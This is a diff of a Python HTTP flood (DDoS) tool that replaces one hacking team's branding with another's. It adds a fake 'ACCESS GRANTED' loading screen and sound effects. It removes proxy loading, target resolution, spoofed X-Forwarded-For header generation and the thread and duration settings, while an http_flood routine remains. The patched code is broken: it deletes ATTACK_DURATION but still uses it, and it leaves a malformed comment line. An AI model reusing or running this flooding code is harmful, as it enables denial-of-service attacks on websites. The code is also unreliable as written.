@@ -3,82 +3,84 @@ import random
 import socket
 import threading
 import time
-import requests
-from urllib.parse import urlparse
-import shutil
 import sys
-import webbrowser
 
 # === CONFIGURATION === #
-NUM_THREADS = min(1000000, (os.cpu_count() or 4) * 10000)
-BURST_REQUESTS = 10
-ATTACK_DURATION = 20
 PROXY_FILE = "proxies.txt"
 FAKE_UA_LIST = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-    "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
+    "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
 ]
 
-# === INTRO CARD === #
-def show_intro():
-    print("\033[94m")
-    print("""_______________________________________________
-Wellcome to Our Tools🔥
-\033[1;32mThis Tools Developer By Team RF Cyber Force
-__________________________________________________
-||||||||                            ||||||||
-||||||||                            ||||||||
-||||||||                            ||||||||
-||||||||                            ||||||||
-================================================
-\033[1;33mDEVELOPER ▶ MD HASIB
-TEAM ▶︎RF CYBER FORCE
-CEO   ▶︎MD HASIB 
-CHANNEL  ▶︎RF PROGRAMING HUB
-TOOLS NAME ▶︎3X DARK69 DDOS TOOLS
-================================================""")
-    print("\033[0m")
-    time.sleep(2)
+# === COLORS === #
+R = "\033[91m"
+G = "\033[92m"
+Y = "\033[93m"
+B = "\033[94m"
+C = "\033[96m"
+W = "\033[97m"
+RESET = "\033[0m"
 
-# === UI BANNER === #
-def show_banner():
-    os.system("cls" if os.name == "nt" else "clear")
-    show_intro()
-    print("""\033[95m
-╔═════════════════════════════════════════════════════════╗
-  ☠️TEAM RF CYBER FROCE ☠️               
- 🔥 Coded by: MD HASIB| Proxy + Multi-Vector Engine 🔥    ║
-╠═════════════════════════════════════════════════\033[0m
-""".format(NUM_THREADS))
-    time.sleep(1)
-
-# === LOAD PROXIES === #
-def load_proxies():
-    if not os.path.exists(PROXY_FILE):
-        return None
-    with open(PROXY_FILE) as f:
-        lines = [line.strip() for line in f if line.strip()]
-        return lines if lines else None
-
-# === TARGET RESOLUTION === #
-def resolve_target(target_url):
+# === SOUND FUNCTION === #
+def play_hacking_sound():
+    """
+    Termux এর জন্য: `pkg install mpv` এবং স্ক্রিপ্টের ফোল্ডারে `hack_sound.mp3` রাখতে হবে।
+    Windows এর জন্য: অটোমেটিক বীপ সাউন্ড হবে।
+    """
     try:
-        domain = urlparse(target_url).netloc if "http" in target_url else target_url
-        ip = socket.gethostbyname(domain)
-        return domain, ip
+        if os.name == 'nt':
+            import winsound
+            winsound.Beep(1000, 200)
+            time.sleep(0.1)
+            winsound.Beep(2000, 400)
+        else:
+            # Termux/Linux background sound
+            os.system("mpv hack_sound.mp3 > /dev/null 2>&1 &") 
     except:
-        return target_url, None
+        pass
 
-def generate_headers(domain):
-    return {
-        "User-Agent": random.choice(FAKE_UA_LIST),
-        "Referer": f"https://{domain}/?id={random.randint(100000,999999)}",
-        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    }
+# === HELPER FUNCTIONS === #
+def clear_screen():
+    os.system("cls" if os.name == "nt" else "clear")
 
-# === ATTACK MODES === #
+# === INTRO & BANNER === #
+def show_intro():
+    # সাউন্ড চালু করা হচ্ছে
+    threading.Thread(target=play_hacking_sound).start()
+    
+    clear_screen()
+    print(f"{C}\n    Loading Cyber Regin System...\n    [■■■□□□□□□□] 30%")
+    time.sleep(0.5)
+    clear_screen()
+    print(f"{C}\n    Loading Cyber Regin System...\n    [■■■■■■■□□□] 70%")
+    time.sleep(0.5)
+    clear_screen()
+    print(f"{G}\n    Loading Cyber Regin System...\n    [■■■■■■■■■■] 100% - ACCESS GRANTED")
+    time.sleep(0.8)
+    clear_screen()
+
+def show_banner():
+    clear_screen()
+    banner_art = f"""{C}
+      ______      __               ____             _       
+     / ____/_  __/ /_  ___  _____ / __ \___  ____ _(_)___  
+    / /   / / / / __ \/ _ \/ ___// /_/ / _ \/ __ `/ / __ \ 
+   / /___/ /_/ / /_/ /  __/ /   / _, _/  __/ /_/ / / / / / 
+   \____/\__, /_.___/\___/_/   /_/ |_|\___/\__, /_/_/ /_/  
+        /____/                            /____/           
+    {RESET}"""
+    print(banner_art)
+    print(f"{R}╔════════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{R}║{W}                 WELCOME TO CYBER REGIN TOOLS               {R}║{RESET}")
+    print(f"{R}╠════════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{R}║{Y}  [+] DEVELOPER : {W}MAIM YEAGER                               {R}║{RESET}")
+    print(f"{R}║{Y}  [+] TEAM      : {W}CR CYBER REGIN                            {R}║{RESET}")
+    print(f"{R}║{Y}  [+] CEO       : {W}ALIF ROHMAN                               {R}║{RESET}")
+    print(f"{R}║{Y}  [+] STATUS    : {G}PREMIUM & ACTIVE                          {R}║{RESET}")
+    print(f"{R}╚════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"\n{B} ==> SYSTEM IS READY...{RESET}\n")
+     === ATTACK MODES === #
 def http_flood(domain, url, proxies=None):
     def flood():
         end_time = time.time() + ATTACK_DURATION
